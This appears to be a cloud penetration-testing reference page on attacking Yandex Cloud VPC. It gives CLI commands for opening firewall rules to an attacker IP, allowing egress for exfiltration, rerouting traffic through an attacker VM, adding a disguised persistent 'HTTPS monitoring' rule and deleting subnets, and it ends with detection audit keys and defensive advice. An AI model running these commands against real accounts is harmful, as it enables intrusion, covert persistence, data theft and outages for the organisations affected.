# VPC — Virtual Private Cloud

## Overview

VPC provides networking: virtual networks, subnets, security groups (firewalls), route tables, NAT gateways, and private/public IP addresses. Security group manipulation is the primary vector for enabling lateral movement and opening access.

## Lateral Movement

### Security Group Modification

With `vpc.securityGroups.editor`:

```bash
# Open SSH from attacker IP
yc vpc security-group update-rules <sg-id> \
  --add-rule "direction=ingress,port=22,protocol=tcp,v4-cidrs=<attacker-ip>/32"

# Open all ports from attacker IP
yc vpc security-group update-rules <sg-id> \
  --add-rule "direction=ingress,from-port=1,to-port=65535,protocol=tcp,v4-cidrs=<attacker-ip>/32"

# Allow all egress (for exfiltration)
yc vpc security-group update-rules <sg-id> \
  --add-rule "direction=egress,from-port=1,to-port=65535,protocol=any,v4-cidrs=0.0.0.0/0"
```

### Route Table Manipulation

```bash
# Add route to redirect traffic through attacker VM
yc vpc route-table update <rt-id> \
  --route destination=10.0.0.0/8,next-hop=<attacker-vm-ip>
```

### NAT Gateway Abuse

If a NAT gateway provides egress for private subnets, compromising the NAT gateway or its configuration enables traffic interception.

---

## Post-Exploitation / Enumeration

```bash
yc vpc network list --folder-id <folder-id>
yc vpc subnet list --folder-id <folder-id>
yc vpc security-group list --folder-id <folder-id>
yc vpc security-group get <sg-id>       # See all rules
yc vpc route-table list --folder-id <folder-id>
yc vpc address list --folder-id <folder-id>  # Public IPs
```

### Network Topology Mapping

Map the full network by correlating:
- Subnets (CIDR ranges)
- Security group assignments (which VMs use which SGs)
- Route tables (traffic flow)
- Public IP assignments

---

## Persistence

### Permissive Security Group Rules

Add overly broad rules that blend with legitimate traffic:

```bash
yc vpc security-group update-rules <sg-id> \
  --add-rule "direction=ingress,port=443,protocol=tcp,v4-cidrs=0.0.0.0/0,description=HTTPS monitoring"
```

### Static Public IP Assignment

Assign a public IP to an attacker-controlled VM for persistent external access.

---

## Impact

### Network Disruption

```bash
# Clear all security group rules (block all traffic)
yc vpc security-group update-rules <sg-id> --clear-rules

# Delete subnets
yc vpc subnet delete <subnet-id>
```

---

## Detection

| Event | Audit Key |
|---|---|
| Security group rule change | `vpc.securityGroups.updateRules` |
| Route table modification | `vpc.routeTables.update` |
| Network creation/deletion | `vpc.networks.create/delete` |
| Subnet changes | `vpc.subnets.create/delete` |

## Defensive Recommendations

1. Use deny-by-default security groups
2. Restrict security group editor role
3. Alert on security group rule changes
4. Document expected network topology and detect drift
5. Use VPC flow logs for traffic analysis
